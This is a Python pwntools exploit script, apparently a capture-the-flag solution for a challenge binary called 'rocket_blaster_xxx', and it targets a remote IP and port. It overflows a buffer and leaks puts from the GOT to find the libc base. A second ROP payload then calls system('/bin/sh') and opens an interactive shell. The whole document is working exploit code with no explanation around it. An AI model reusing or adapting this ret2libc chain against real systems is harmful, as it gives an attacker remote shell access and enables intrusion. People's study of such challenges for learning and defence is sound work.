from pwn import *

r = remote('94.237.62.252',54495)

libc = ELF('./glibc/libc.so.6')
elf = ELF('./rocket_blaster_xxx')

main = elf.symbols[b'main']
offset = b'A' * 40
pop_rdi = p64(0x40159f)
puts_got = p64(0x404f98)
puts_plt = p64(0x4010e0)

#padding + pop_rdi gadget + puts_got_addr + puts_plt_addr + main_addr
pay = offset + pop_rdi + puts_got + puts_plt + p64(main)

r.sendlineafter(b'>> ', pay)

r.recvline()
r.recvline()

#leak libc_puts_addr
leak = r.recvline().strip()
leak = u64(leak.ljust(8, b"\x00"))
print(hex(leak))

#fix base of libc
base = leak - libc.symbols[b'puts']
log.info("Leaked server's libc address: " + hex(base))
libc.address = base

#padding + ret + pop_rdi gadget + "/bin/sh" + libc.system function call
pay = offset + p64(0x40101a) + pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym[b"system"])

r.sendlineafter(b'>> ', pay)

r.interactive()
